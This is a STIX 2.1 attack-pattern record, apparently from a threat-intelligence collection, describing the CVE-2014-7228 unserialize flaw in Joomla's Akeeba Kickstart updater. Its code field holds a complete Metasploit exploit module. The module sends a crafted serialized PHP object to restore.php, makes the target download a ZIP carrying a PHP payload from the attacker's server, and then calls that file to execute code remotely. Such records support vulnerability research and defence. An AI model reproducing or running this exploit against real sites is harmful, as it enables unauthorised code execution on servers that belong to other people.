{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc95a289-1adc-4e3c-a94a-6a59245f6bcb",
    "created": "2024-08-14T17:13:09.760045Z",
    "modified": "2024-08-14T17:13:09.760049Z",
    "name": "\"Joomla Akeeba Kickstart Unserialize Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and earlier 3.x versions and 3.3.0 through 3.3.4 versions. The vulnerability affects the Akeeba component, which is responsible for Joomla! updates. Nevertheless it is worth to note that this vulnerability is only exploitable during the update of the Joomla! CMS.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_akeeba_unserialize.rb",
            "external_id": "joomla_akeeba_unserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7228"
        },
        {
            "source_name": "reference",
            "url": "http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html"
        },
        {
            "source_name": "reference",
            "url": "http://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\nrequire 'json'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Joomla Akeeba Kickstart Unserialize Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and earlier\n        3.x versions and 3.3.0 through 3.3.4 versions. The vulnerability affects the Akeeba\n        component, which is responsible for Joomla! updates. Nevertheless it is worth to note\n        that this vulnerability is only exploitable during the update of the Joomla! CMS.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Johannes Dahse',               # Vulnerability discovery\n          'us3r777 <us3r777[at]n0b0.so>'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-7228' ],\n          [ 'URL', 'http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html'],\n          [ 'URL', 'https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html'],\n          [ 'URL', 'http://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/'],\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Joomla < 2.5.25 / Joomla 3.x < 3.2.5 / Joomla 3.3.0 < 3.3.4', {} ]\n        ],\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-09-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla']),\n        OptInt.new('HTTPDELAY',    [false, 'Seconds to wait before terminating web server', 5])\n      ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restoration.php')\n    )\n\n    if res && res.code == 200\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def primer\n    srv_uri = \"#{get_uri}/#{rand_text_alpha(4 + rand(3))}.zip\"\n\n    php_serialized_akfactory = 'O:9:\"AKFactory\":1:{s:18:\"' + \"\\x00\" + 'AKFactory' + \"\\x00\" + 'varlist\";a:2:{s:27:\"kickstart.security.password\";s:0:\"\";s:26:\"kickstart.setup.sourcefile\";s:' + srv_uri.length.to_s + ':\"' + srv_uri + '\";}}'\n    php_filename = rand_text_alpha(8 + rand(8)) + '.php'\n\n    # Create the zip archive\n    print_status(\"Creating archive with file #{php_filename}\")\n    zip_file = Rex::Zip::Archive.new\n    zip_file.add_file(php_filename, payload.encoded)\n    @zip = zip_file.pack\n\n    # First step: call restore to run _prepare() and get an initialized AKFactory\n    print_status(\"Sending PHP serialized object...\")\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),\n      'vars_get'  => {\n        'task'    => 'stepRestore',\n        'factory' => Rex::Text.encode_base64(php_serialized_akfactory)\n      }\n    })\n\n    unless res && res.code == 200 && res.body && res.body =~ /^###\\{\"status\":true.*\\}###/\n      print_status(\"#{res.code}\\n#{res.body}\")\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response\")\n    end\n\n    # Second step: modify the currentPartNumber within the returned serialized AKFactory\n    json = /###(.*)###/.match(res.body)[1]\n    begin\n      b64encoded_prepared_factory = JSON.parse(json)['factory']\n    rescue JSON::ParserError\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response, cannot parse JSON\")\n    end\n\n    prepared_factory = Rex::Text.decode_base64(b64encoded_prepared_factory)\n    modified_factory = prepared_factory.gsub('currentPartNumber\";i:0', 'currentPartNumber\";i:-1')\n\n    print_status(\"Sending initialized and modified AKFactory...\")\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),\n      'vars_get'  => {\n        'task'    => 'stepRestore',\n        'factory' => Rex::Text.encode_base64(modified_factory)\n      }\n    })\n\n    unless res && res.code == 200 && res.body && res.body =~ /^###\\{\"status\":true.*\\}###/\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response\")\n    end\n\n    register_files_for_cleanup(php_filename)\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', php_filename)\n    }, 2)\n\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) { super }\n    rescue Timeout::Error\n      # When the server stops due to our timeout, this is raised\n    end\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    if @zip && request.uri =~ /\\.zip$/\n      print_status(\"Sending the ZIP archive...\")\n      send_response(cli, @zip, { 'Content-Type' => 'application/zip' })\n      return\n    end\n\n    print_status(\"Sending not found...\")\n    send_not_found(cli)\n  end\n\n  def autofilter\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-29",
    "x_mitre_platforms": [
        "['php']"
    ]
}